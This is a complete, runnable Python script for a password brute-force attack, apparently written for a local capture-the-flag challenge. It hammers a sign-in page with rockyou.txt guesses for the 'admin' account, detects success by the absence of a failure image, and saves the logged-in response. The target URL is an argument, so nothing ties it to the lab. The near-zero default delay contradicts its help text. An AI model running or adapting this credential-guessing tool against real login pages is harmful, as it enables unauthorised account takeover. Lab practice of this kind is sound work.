#!/usr/bin/env python3
"""
Bruteforce script for local CTF password cracking
Target: http://localhost:8080/?page=signin
Username: admin
Detection: Wrong password shows 'WrongAnswer.gif' in response
"""

import requests
import time
import sys
import argparse

# Create session for connection reuse (faster)
session = requests.Session()

def try_login(url, username, password):
    """
    Attempts login with given password via GET request.
    Returns (response_object, response_text) tuple.
    """
    params = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    try:
        response = session.get(url, params=params, timeout=15)
        return response, response.text
    except requests.exceptions.Timeout:
        print(f"[!] Timeout on password: {password}")
        return None, ""
    except Exception as e:
        print(f"[!] Error: {e}")
        return None, ""

def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description='Bruteforce password for local CTF challenge'
    )
    parser.add_argument(
        '--url', '-u',
        default='http://localhost:8080/?page=signin',
        help='Target URL (default: http://localhost:8080/?page=signin)'
    )
    parser.add_argument(
        '--username',
        default='admin',
        help='Username to test (default: admin)'
    )
    parser.add_argument(
        '--wordlist', '-w',
        default='rockyou.txt',
        help='Password wordlist file (default: rockyou.txt)'
    )
    parser.add_argument(
        '--delay', '-d',
        type=float,
        default=0.001,
        help='Delay between attempts in seconds (default: 0.1)'
    )
    parser.add_argument(
        '--max', '-m',
        type=int,
        default=0,
        help='Maximum attempts (0 = unlimited, default: 0)'
    )
    
    args = parser.parse_args()
    
    # Display banner
    print("="*60)
    print("CTF Password Bruteforce Tool")
    print("="*60)
    print(f"[*] Target URL: {args.url}")
    print(f"[*] Username: {args.username}")
    print(f"[*] Wordlist: {args.wordlist}")
    print(f"[*] Delay: {args.delay}s between attempts")
    print(f"[*] Detection: Looking for 'WrongAnswer.gif' in response")
    print("="*60)
    print("[!] WARNING: Only use on systems you own or have permission to test!")
    print("="*60)
    
    # Check if wordlist exists
    try:
        with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            pass
    except FileNotFoundError:
        print(f"[!] ERROR: Wordlist file '{args.wordlist}' not found!")
        sys.exit(1)
    
    # Start bruteforce
    attempt = 0
    start_time = time.time()
    
    try:
        with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                password = line.strip()
                
                # Skip empty lines
                if not password:
                    continue
                
                attempt += 1
                
                # Check max attempts limit
                if args.max > 0 and attempt > args.max:
                    print(f"\n[*] Reached maximum attempts limit ({args.max})")
                    break
                
                # Print every attempt
                print(f"[+] Attempt #{attempt}: {args.username}:{password}")
                
                # Try the password
                response, text = try_login(args.url, args.username, password)
                
                if response is None:
                    # Network error, skip this password
                    time.sleep(args.delay)
                    continue
                
                # Check if login failed (wrong password shows WrongAnswer.gif)
                if 'WrongAnswer.gif' in text or 'WrongAnswer' in text:
                    # Wrong password, continue
                    pass
                else:
                    # Response is different - potential success!
                    elapsed = time.time() - start_time
                    print("\n" + "="*60)
                    print("[+] SUCCESS! Password found!")
                    print("="*60)
                    print(f"[+] Username: {args.username}")
                    print(f"[+] Password: {password}")
                    print(f"[+] Attempts: {attempt}")
                    print(f"[+] Time elapsed: {elapsed:.2f} seconds")
                    print("="*60)
                    
                    # Save the successful response
                    output_file = 'success_response.html'
                    with open(output_file, 'w', encoding='utf-8') as out:
                        out.write(text)
                    print(f"[+] Full response saved to: {output_file}")
                    
                    # Show response snippet
                    print("\n[+] Response snippet:")
                    print("-"*60)
                    snippet = text[:500].replace('\n', ' ')
                    print(snippet)
                    print("-"*60)
                    
                    return 0
                
                # Delay before next attempt
                time.sleep(args.delay)
    
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        elapsed = time.time() - start_time
        print(f"[*] Tested {attempt} passwords in {elapsed:.2f} seconds")
        return 1
    
    # No password found
    elapsed = time.time() - start_time
    print("\n" + "="*60)
    print("[*] Bruteforce completed - No password found")
    print(f"[*] Total attempts: {attempt}")
    print(f"[*] Time elapsed: {elapsed:.2f} seconds")
    print("="*60)
    return 1

if __name__ == '__main__':
    sys.exit(main())
